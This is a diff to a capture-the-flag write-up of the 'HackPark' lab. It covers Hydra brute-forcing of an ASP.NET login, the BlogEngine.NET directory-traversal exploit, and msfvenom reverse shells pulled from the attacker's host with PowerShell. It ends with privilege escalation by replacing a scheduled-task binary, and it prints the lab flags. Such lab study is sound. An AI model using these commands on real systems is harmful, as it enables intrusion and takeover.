@@ -104,9 +104,10 @@ Type of request:
 Using Burpsuite Intruder, try a brute-force on that `admin` user. Fire up Burpsuite, go to login page, 
 set Burpsuite to intercept, and try to log in. Catch the `__VIEWSTATE` for use in Hydra.
 
-| ![Burpsuite proxy intercept](../../_static/images/screenshot-intercept.png)
-|:--:|
-| Burpsuite intercepted failed login attempt |
+|                                                                                                                                                                                                                                                               ![Burpsuite proxy intercept](../../_static/images/screenshot-intercept.png)                                                                                                                                                                                                                                                               |
+|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+| __VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2F<br/>aa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBa<br/>hqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&<br/>__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjW<br/>uzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZcl<br/>fGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9<br/>&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent<br/>%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in |
+
 
 Mini hydra cheatsheet:
 
@@ -117,19 +118,17 @@ Mini hydra cheatsheet:
 | hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                                | Attack a Windows Remote Desktop with a password <br/>list.                                                                                                                        |
 | hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:<br/>log=^USER^&pwd=^PASS^&wp-submit=<br/>Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra <br/>to brute force.                                                                                                                      |
 
-Using:
+Constructing the hydra command:
 
-* `-f` to stop the attack when a valid password is found
-* `-l` to specify the username for the bruteforce attack
-* `-P` to specify the wordlist to use for the bruteforce
-* UserName=`^USER^`
-* Password=`^PASS^`
-* Wordlist for passwords = `/usr/share/wordlists/rockyou.txt`
+* `-f` flag to stop the attack when a valid password is found
+* `-l` flag to specify the username for the bruteforce attack = `admin`
+* `-P` flag to specify the wordlist to use for the bruteforce = `/usr/share/wordlists/rockyou.txt`
 * IP of the target server = `10.10.39.227`
 * Type of attack = `http-post-form`
-* Page to attack = `/Account/login.aspx`
-* Session info gathered from Burp = `__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in`
-* Adding a Failed login message so we can detect when we have a success = `:Login Failed`
+* Page to attack = "`/Account/login.aspx:__VIEWSTATE...`"
+* In `__VIEWSTATE...` change `UserName=admin` to `UserName=^USER^`
+* In `__VIEWSTATE...` change `Password=admin` to `Password=^PASS^`
+* Add a Failed login message to be able to detect when we have success = `:Login Failed`
 
 ```text
 # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.227 http-post-form "/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
@@ -185,6 +184,148 @@ Get the CVE:
     # grep CVE 46353.cs
     # CVE : CVE-2019-6714
 
+With possible exploit [BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353)
+
+1. Download and modify the IP and port values in the script:
+
+```text
+
+```
+
+2. Save and rename script to `PostView.ascx`
+3. Go to posts (`http://IP address target machine/admin/#/content/posts`) and click on "Welcome to HackPark" to edit it.
+4. On the edit bar on top of the post, click on the "File Manager" icon.
+5. Click on the "+ UPLOAD" button and upload the `PostView.ascx` script
+6. Close the file manager and click on "Save"
+7. Start a listener
+
+```text
+rlwrap nc -nlvp 442
+```
+
+8. Go to http://IP address target machine/?theme=../../App_Data/files
+
+```text
+whoami
+c:\windows\system32\inetsrv>whoami
+iis apppool\blog
+```
+
 ## Privilege escalation
 
+Pivot from netcat to a meterpreter session, and enumerate the machine to identify potential vulnerabilities. Then use 
+this gathered information to exploit the system and become Administrator. 
+
+```text
+# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=5555 -f exe -o revshell.exe
+```
+
+In the directory where the `revshell.exe` is, start a web server:
+
+    # python3 -m http.server 8000
+
+In the reverse shell we already have:
+
+    powershell -c "Invoke-WebRequest -Uri 'http://IP address attack machine:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+
+In a new terminal, set up a Metasploit multi-handler:
+
+```text
+# msfconsole -q
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST <IP address attack machine>
+msf5 exploit(multi/handler) > set LPORT 5555
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on <IP address attack machine>:5555 
+```
+
+In the reverse shell terminal, start the executable: 
+
+```text
+C:\windows\system32\inetsrv>cd \windows\temp
+c:\Windows\Temp>.\revshell.exe
+```
+
+In the `msfconsole` terminal, a `meterpreter` shell has appeared:
+
+```text
+meterpreter > 
+```
+
+Get detailed information about the Windows system:
+
+```text
+meterpreter > sysinfo
+meterpreter > ps
+meterpreter > cd "c:\program files (x86)"
+meterpreter > ls
+meterpreter > cd SystemScheduler
+meterpreter > ls
+meterpreter > cd events
+meterpreter > ls
+```
+
+Replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell.
+
+Create the payload:
+
+```text
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=6666 -f exe -o Message.exe
+```
+
+In the directory with the exploit, start a http server:
+
+    # python3 -m http.server 8080
+
+In Metasploit, set up a multi-handler:
+
+```text
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <IP address attack machine>
+msf6 exploit(multi/handler) > set LPORT 6666
+msf6 exploit(multi/handler) > run
+```
+
+In the existing reverse shell terminal, download the new reverse shell and replace the existing `Message.exe`:
+
+    powershell -c "Invoke-WebRequest -Uri 'http://IP address attack machine:8080/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
+
+### User flag
+
+```text
+meterpreter > getuid 
+Server username: HACKPARK\Administrator
+meterpreter > cd c:\users\jeff\desktop\
+meterpreter > cat user.txt 
+759bd8af507517bcfaede78a21a73e39
+```
+
+### Root flag
+
+```text
+meterpreter > cd C:\users\administrator\desktop
+meterpreter > cat root.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+```
+
 ## Privilege escalation without Metasploit 
+
+Get WinPEAS:
+
+    # wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
+
+Start a http server:
+
+    # python -m http.server 8888
+
+In the reverse shell, download WinPEAS:
+
+    powershell -c "Invoke-WebRequest -Uri 'http://<IP address target>:8888/WinPEAS.bat' -OutFile 'c:\windows\temp\winpeas.exe'"
+
+Drop into a normal cmd shell and execute WinPEAS:
+
+    meterpreter > shell
+    c:\Windows\Temp> winpeas.exe
